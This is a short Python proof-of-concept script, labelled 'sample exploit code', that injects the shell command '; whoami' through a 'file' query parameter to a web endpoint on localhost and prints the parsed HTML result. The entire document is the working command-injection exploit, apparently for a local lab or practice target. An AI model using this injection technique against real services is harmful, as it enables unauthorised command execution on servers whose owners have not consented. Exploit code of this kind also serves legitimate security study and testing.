#!/usr/bin/python3
# sample exploit code
# "makee sure the file exists" -> "send command for the file"

import requests
import bs4

url = 'http://127.0.0.1:8888/command'
#url = 'http://127.0.0.1:4444/command'
#url = 'http://127.0.0.1:8080/command'

params = {'file' : '; whoami'}

def exploit():
    print('exploit start')
    res = requests.get(url)
    if res.status_code != 200:
        print('vulnerable files is not found')
    else:
        exploit_res = requests.get(url, params)
        soup = bs4.BeautifulSoup(exploit_res.text, 'html.parser')
        exploit_result = soup.select('.file_result')
        print(exploit_result)

    

if __name__=="__main__":
    exploit()
